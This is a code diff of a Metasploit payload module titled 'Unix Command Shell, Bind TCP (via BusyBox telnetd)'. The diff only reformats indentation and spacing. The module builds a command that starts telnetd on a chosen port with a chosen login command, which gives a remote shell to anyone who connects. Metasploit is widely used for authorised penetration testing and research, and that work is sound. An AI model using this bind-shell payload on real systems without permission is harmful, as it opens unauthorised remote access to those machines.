@@ -8,7 +8,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 26
 
   include Msf::Payload::Single
@@ -16,21 +15,20 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',
-      'Description'   => 'Listen for a connection and spawn a command shell via BusyBox telnetd',
-      'Author'        => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'telnetd',
-      'Payload'       => {
-        'Offsets' => { },
-        'Payload' => ''
-      }
-    ))
+                     'Name' => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',
+                     'Description' => 'Listen for a connection and spawn a command shell via BusyBox telnetd',
+                     'Author' => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'unix',
+                     'Arch' => ARCH_CMD,
+                     'Handler' => Msf::Handler::BindTcp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'RequiredCmd' => 'telnetd',
+                     'Payload' => {
+                       'Offsets' => {},
+                       'Payload' => ''
+                     }))
 
     register_options(
       [
@@ -59,5 +57,4 @@ module MetasploitModule
   def command_string
     "telnetd -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}"
   end
-
 end
